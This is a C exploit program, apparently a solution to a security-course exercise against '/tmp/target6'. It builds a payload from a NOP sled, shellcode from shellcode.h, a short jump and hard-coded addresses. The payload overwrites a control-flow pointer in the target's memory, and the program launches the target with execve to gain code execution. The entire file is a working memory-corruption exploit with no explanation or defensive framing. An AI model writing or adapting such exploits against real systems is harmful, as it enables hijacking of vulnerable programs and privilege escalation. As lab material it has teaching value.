#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

static char payload[201];

int main(void)
{
  char *args[3];
  char *env[1];

  const char *jmpahead = "\xeb\x0c";

  const int bufloc = 0xbffffc80;
  const int exitloc = 0x08049774;

  memset(payload, 0x90, sizeof(payload));
  memcpy(payload + sizeof(payload) - sizeof(shellcode), shellcode, sizeof(shellcode) - 1);
  *(int *)(payload + 130 - 4) = exitloc; // p
  *(int *)(payload + 130 - 8) = bufloc; // a
  memcpy(payload + 130 - 10, jmpahead, 2); // jump
  payload[200] = 0x02;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
